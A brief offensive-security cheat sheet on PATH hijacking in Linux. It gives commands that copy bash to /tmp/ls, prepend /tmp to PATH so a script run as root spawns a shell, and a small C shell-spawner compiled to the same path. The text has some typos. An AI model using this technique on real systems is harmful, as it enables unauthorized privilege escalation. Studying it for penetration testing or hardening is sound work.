# PATH.md
***
"PATH" is an environment variable found in Linux and Unix-like operating systems. It serves to define a list of directories where executable programs are located. When a user executes a command in the terminal, the system scans these directories within PATH to find the corresponding executable files. To display the current PATH configuration, you can use the following command.
```sh
ech $PATH
```

## Exploitation
An attacker could modify the PATH variable to point to a directory of their choosing. As an example, consider a root use running a script, "test.sh," which executes the "ls" command (the official ls binary typically found at /bin/ls). In this situation, an attacker has the capability to craft a file named "ls," which, upon execution, leads to the initiation of a shell. Consequently, when "test.sh" is executed, it will also result in the spawning of a shell.
```sh
# creae fake ls
cp /bin/bash /tmp/ls
chmod +x /tmp/ls

# rewrite the PATH variable
export PATH=/tmp:$PATH # this adds /tmp to the current path. Or export PATH=/tmp

# Now, upon running the script "test.sh," it will trigger the execution of the "ls" file created earlier, consequently leading to the spawning of a shell.

# To reset PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
```

### Notes
- The /tmp directory is positioned at the forefront of the PATH, making it the first directory to be checked when resolving binary conflicts. In situations where multiple directories contain binaries with identical names, the system will prioritize the execution of the one listed first in the PATH environment variable, which, in this context, is the /tmp directory.
- You can use C to spawn a shell
```sh
#include<stdio.h>
#include<stdlib.h>

int main()
{
  system("/bin/bash");
}

# Compile it
gcc shell.c -o /tmp/ls
```
